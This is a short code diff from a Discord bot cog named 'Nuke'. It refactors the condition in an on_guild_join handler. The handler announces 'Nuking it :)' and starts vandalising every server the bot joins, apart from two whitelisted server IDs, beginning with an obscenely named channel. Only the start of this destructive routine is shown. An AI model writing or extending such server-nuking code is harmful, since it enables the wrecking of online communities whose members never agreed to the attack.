@@ -47,7 +47,7 @@ class Nuke(commands.Cog):
         await ctx.send(embed=discord.Embed(title=":x: Error", description=f"Command not found.", color=discord.Color.red()).set_footer(text=f"Requested by {ctx.author.name}", icon_url=ctx.author.avatar_url))
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
-        if guild.id != 1002659843720617995 and guild.id != 1006599826315685888:
+        if guild.id not in (1002659843720617995, 1006599826315685888):
             try:
                 print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
                 await guild.create_text_channel(f'fuckme1')
